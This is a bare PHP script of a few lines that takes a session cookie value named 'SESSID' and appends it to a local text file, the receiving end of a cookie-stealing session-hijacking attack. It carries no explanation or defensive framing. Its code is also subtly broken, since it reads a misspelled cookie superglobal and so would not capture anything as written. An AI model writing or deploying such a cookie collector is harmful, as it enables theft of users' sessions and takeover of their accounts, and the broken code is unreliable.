<?php
$cookie = $_Cookie['SESSID'];
$file = fopen('cookie.txt', 'a');
fwrite($file, $cookie . "\n\n");
?>
